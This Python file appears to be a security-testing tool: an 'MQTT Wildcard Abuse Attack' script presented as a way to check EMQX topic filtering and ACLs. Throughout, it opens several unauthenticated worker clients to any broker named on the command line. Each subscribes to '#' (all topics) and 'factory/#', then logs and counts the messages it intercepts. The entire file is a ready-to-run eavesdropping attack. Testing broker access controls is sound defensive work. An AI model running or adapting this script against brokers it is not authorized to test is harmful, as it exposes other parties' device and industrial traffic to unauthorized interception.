#!/usr/bin/env python3
"""
MQTT Wildcard Abuse Attack Script (Windows Compatible)
======================================================
Simulates wildcard subscription abuse to test EMQX topic filtering and ACL.
Plain TCP (no username/password/TLS).
"""

import paho.mqtt.client as mqtt
import time
import threading
import argparse
import sys
from datetime import datetime

class WildcardAbuseAttack:
    def __init__(self, broker_host="localhost", broker_port=1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.clients = []
        self.attack_stats = {
            "subscriptions_attempted": 0,
            "subscriptions_successful": 0,
            "subscriptions_failed": 0,
            "messages_received": 0,
            "connections_failed": 0,
            "start_time": None,
            "end_time": None
        }

    def create_client(self, client_id):
        """Create MQTT client (no auth / no TLS)"""
        try:
            client = mqtt.Client(client_id=client_id)
            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def wildcard_worker(self, worker_id, wildcard_topics, duration_seconds=60):
        """Worker thread for wildcard abuse attack"""
        client_id = f"wildcard_abuser_{worker_id}"
        client = self.create_client(client_id)

        if not client:
            self.attack_stats["connections_failed"] += 1
            return

        def on_connect(client_obj, userdata, flags, rc):
            if rc == 0:
                print(f" Worker {worker_id}: Connected, starting wildcard abuse...")
                # Subscribe to wildcard topics
                for topic in wildcard_topics:
                    try:
                        result = client_obj.subscribe(topic, qos=1)
                        self.attack_stats["subscriptions_attempted"] += 1
                        # result is (result_code, mid) in paho v1.x
                        if isinstance(result, tuple) and result[0] == 0:
                            self.attack_stats["subscriptions_successful"] += 1
                            print(f" Worker {worker_id}: Subscribed to {topic}")
                        else:
                            # Some versions return an int; treat non-zero as failure
                            if result == 0:
                                self.attack_stats["subscriptions_successful"] += 1
                                print(f" Worker {worker_id}: Subscribed to {topic}")
                            else:
                                self.attack_stats["subscriptions_failed"] += 1
                                print(f" Worker {worker_id}: Failed to subscribe to {topic}")
                    except Exception as e:
                        self.attack_stats["subscriptions_failed"] += 1
                        print(f" Worker {worker_id}: Error subscribing to {topic}: {e}")
            else:
                print(f" Worker {worker_id}: Connection failed: {rc}")
                self.attack_stats["connections_failed"] += 1

        def on_message(client_obj, userdata, msg):
            self.attack_stats["messages_received"] += 1
            if self.attack_stats["messages_received"] % 10 == 0:  # Don't spam
                print(f" Worker {worker_id}: Received message on {msg.topic}")

        def on_subscribe(client_obj, userdata, mid, granted_qos):
            print(f" Worker {worker_id}: Subscription granted (mid={mid}) qos={granted_qos}")

        try:
            client.on_connect = on_connect
            client.on_message = on_message
            client.on_subscribe = on_subscribe

            # Connect to broker
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()

            # Run for specified duration
            time.sleep(duration_seconds)

            print(f" Worker {worker_id}: Completed wildcard abuse attack")

        except Exception as e:
            print(f" Worker {worker_id}: Error: {e}")
            self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass

    def launch_attack(self, num_workers=3, duration_seconds=60, wildcard_topics=None):
        """Launch wildcard abuse attack"""
        if wildcard_topics is None:
            wildcard_topics = [
                "#",  # Subscribe to everything
                # "+/+/+",  # Three-level wildcard
                 "factory/#",  # Factory wildcard

            ]

        print(f" Starting Wildcard Abuse Attack")
        print(f"   Workers: {num_workers}")
        print(f"   Duration: {duration_seconds} seconds")
        print(f"   Wildcard topics: {len(wildcard_topics)}")
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()

        # Create worker threads
        threads = []
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.wildcard_worker,
                args=(i, wildcard_topics, duration_seconds)
            )
            threads.append(thread)

        # Start all workers
        for thread in threads:
            thread.start()

        # Monitor attack
        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        """Print attack statistics"""
        duration = self.attack_stats["end_time"] - self.attack_stats["start_time"]

        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Subscriptions attempted: {self.attack_stats['subscriptions_attempted']}")
        print(f"Subscriptions successful: {self.attack_stats['subscriptions_successful']}")
        print(f"Subscriptions failed: {self.attack_stats['subscriptions_failed']}")
        print(f"Messages received: {self.attack_stats['messages_received']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")

        if self.attack_stats['subscriptions_attempted'] > 0:
            success_rate = (self.attack_stats['subscriptions_successful'] /
                           self.attack_stats['subscriptions_attempted'] * 100)
            print(f"Subscription success rate: {success_rate:.1f}%")

        if duration > 0:
            print(f"Messages per second: {self.attack_stats['messages_received']/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Wildcard Abuse Attack (plain TCP)")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--topics", nargs="+", help="Custom wildcard topics")

    args = parser.parse_args()

 
    attack = WildcardAbuseAttack(
        broker_host=args.broker,
        broker_port=args.port
    )

    # Launch attack
    attack.launch_attack(
        num_workers=args.workers,
        duration_seconds=args.duration,
        wildcard_topics=args.topics
    )

if __name__ == "__main__":
    main()
